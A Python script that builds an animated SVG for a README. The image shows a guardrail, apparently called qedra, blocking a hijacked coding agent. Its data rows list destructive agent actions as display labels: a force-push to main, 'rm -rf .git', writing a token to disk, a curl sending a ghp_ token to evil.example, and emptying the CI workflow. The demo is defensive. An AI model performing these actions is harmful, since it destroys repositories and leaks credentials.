"""Generate an animated SVG showing the guardrail blocking a hijacked agent live.
Light theme, self-contained (no scripts, no external refs), loops in a GitHub
README. Content is the real demo sequence.
"""
ROWS = [
    ("allow", "write calc.py", "the fix"),
    ("allow", "git add calc.py", ""),
    ("block", "git push origin main --force", "force-push main"),
    ("block", "rm -rf .git", "delete the repo"),
    ("block", "write config.py  (ghp_ token)", "secret to disk"),
    ("block", "curl evil.example  -d ghp_...", "exfiltrate"),
    ("block", "empty .github/workflows/ci.yml", "wipe CI"),
    ("allow", "cargo build --release", ""),
]
W, H = 900, 560
GREEN, RED, INK, MUTED = "#1a7f37", "#cf222e", "#1f2328", "#6e7781"
X_ICON, X_TEXT, X_VERDICT = 54, 82, W - 46
TOP = 108
LH = 44
CYCLE = 9.0            # seconds per loop
STEP = 0.42           # stagger between rows


def icon(kind, cy):
    if kind == "allow":
        return f'<path d="M {X_ICON-7} {cy-8} L {X_ICON-7} {cy+8} L {X_ICON+8} {cy} Z" fill="{GREEN}"/>'
    return (f'<circle cx="{X_ICON}" cy="{cy}" r="9" fill="{RED}"/>'
            f'<rect x="{X_ICON-5}" y="{cy-2}" width="10" height="4" rx="1" fill="#fff"/>')


parts = [
    f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 {W} {H}" font-family="ui-monospace,SFMono-Regular,Menlo,Consolas,monospace">',
    '<style>',
    '  .row{opacity:0;animation:reveal %.1fs ease-out infinite}' % CYCLE,
    '  @keyframes reveal{0%%{opacity:0}%d%%{opacity:0}%d%%{opacity:1}92%%{opacity:1}98%%{opacity:0}100%%{opacity:0}}'
    % (2, 8),
    '</style>',
    # card
    f'<rect x="10" y="10" width="{W-20}" height="{H-20}" rx="14" fill="#ffffff" stroke="#d0d7de"/>',
    f'<rect x="10" y="10" width="{W-20}" height="46" rx="14" fill="#f6f8fa"/>',
    '<rect x="10" y="40" width="%d" height="16" fill="#f6f8fa"/>' % (W-20),
    '<circle cx="34" cy="33" r="6" fill="#ff5f57"/><circle cx="54" cy="33" r="6" fill="#febc2e"/><circle cx="74" cy="33" r="6" fill="#28c840"/>',
    f'<text x="{W//2}" y="38" text-anchor="middle" font-size="15" fill="{MUTED}">qedra</text>',
    # subtitle line
    f'<text x="30" y="86" font-size="16" fill="{INK}">A hijacked coding agent tries to wreck the repo. The gate blocks it, live.</text>',
]

for i, (kind, text, verdict) in enumerate(ROWS):
    cy = TOP + i * LH + 22
    delay = i * STEP
    color = GREEN if kind == "allow" else RED
    tag = "ALLOW" if kind == "allow" else "BLOCK"
    parts.append(f'<g class="row" style="animation-delay:{delay:.2f}s">')
    parts.append(icon(kind, cy))
    parts.append(f'<text x="{X_TEXT}" y="{cy+5}" font-size="17" fill="{INK}">{text}</text>')
    if verdict:
        parts.append(f'<text x="{X_VERDICT-96}" y="{cy+5}" text-anchor="end" font-size="14" fill="{MUTED}">{verdict}</text>')
    parts.append(f'<text x="{X_VERDICT}" y="{cy+5}" text-anchor="end" font-size="15" font-weight="700" fill="{color}">{tag}</text>')
    parts.append('</g>')

# divider + outcome
dy = TOP + len(ROWS) * LH + 20
parts.append(f'<line x1="30" y1="{dy}" x2="{W-30}" y2="{dy}" stroke="#d0d7de"/>')
parts.append(f'<g class="row" style="animation-delay:{len(ROWS)*STEP:.2f}s">')
# drawn green check (guaranteed to render, no font dependency)
cx, cyc = 38, dy + 29
parts.append(f'<path d="M {cx-7} {cyc} L {cx-2} {cyc+6} L {cx+8} {cyc-7}" '
             f'fill="none" stroke="{GREEN}" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>')
parts.append(f'<text x="{cx+18}" y="{dy+34}" font-size="16" fill="{GREEN}" font-weight="700">'
             'repo intact, no secret written, CI kept, fix applied, audit chain verifies</text>')
parts.append('</g>')
parts.append('</svg>')

open("docs/demo.svg", "w").write("\n".join(parts))
print("wrote docs/demo.svg")
